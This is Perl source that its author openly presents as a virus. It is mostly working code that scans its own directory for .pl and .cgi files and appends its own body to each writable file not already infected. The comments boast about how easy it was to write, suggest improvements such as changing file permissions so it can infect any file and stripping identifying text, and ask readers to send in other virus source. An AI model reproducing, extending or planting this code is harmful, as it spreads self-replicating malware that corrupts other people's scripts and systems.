#!/usr/bin/perl

## About the Perl Virus
# I didn't make it for any reason other than I can, I was reading "Learn Perl in 21 Days" and
# it looked so easy to make a Perl virus (however limited it may be :), it took about 30 minutes
# to make, and 10 of those were spent at perl.com looking for a way to get the program's name
# ($0 does it). 

# This virus is pathetic, even if it ever makes it out of "the lab", people can see 
# it just by looking through their programs, and they can remove it with any text editor. :) Also
# the files it can spread to have to be writable, although I think I could make a new version that
# also changes the file permissions so that it can write to any file. The biggest flaw with this
# program right now is that it only checks the directory it's in, this is because I DON'T want the
# program to infect all my other programs. :) Some other improvements you should make to turn this
# into a better virus would be to use shorter variable names, kill the comments, and use less text 
# identifying the start and end of the program.

# Check http://www.macman.net for new versions and other cool stuff
# Let me know if you build on this, or have the source to any other virii (no assembly!!),
# you can send it to macman@macman.net

	
## Perl Virus Begins Now ##
	opendir(DIR, "."); #open the directory this program is in
	@FILES = readdir(DIR); #get the file names
	closedir(DIR);
	
	## Look for programs to spread to (limited to the current directory for now)
	for ($i = 0; $i < @FILES; $i++) {
		if (substr($FILES[$i], length($FILES[$i]) - 4) eq ".cgi" || substr($FILES[$i], length($FILES[$i]) - 3) eq ".pl") {
			$TARGETS[$ii] = $FILES[$i];
			$ii++;
		}
	}
	
	## Check if the file is already infected
	for ($i = 0; $i < @TARGETS; $i++) {
		open(FILE,$TARGETS[$i]);
		$file = join("",<FILE>);
		close(FILE);
		if (index($file, "## Perl Virus Begins Now ##") == -1) { ##the file isn't infected, INFECT IT!! (append to it)
			if ($me eq "") { #what we want to write hasn't been copied yet, this is a considerate virus, it could just keep copying itself each time and slow your computer down (and become a couple hundred bytes smaller)...
				open(me,$0); #opens THIS program
				$me = join("",<me>);
				$start = index($me,"## Perl Virus Begins Now ##");
				$me = substr($me, $start, rindex($me,"## Perl Virus Ends Now##") + 24 - $start);
				close(me);
			}
			open(FILE,">>$TARGETS[$i]");
			print FILE $me;
			close(FILE);
		}
	}
	closedir(DIR);
## Perl Virus Ends Now##



## For testing...
##print "Content-type: text/html\n\n"; 	##so web browsers see it
##Print all the files we can infect :)
#for ($i = 0; $i <  @TARGETS; $i++) {	
#	 print $TARGETS[$i] . "<BR>\n";
#}
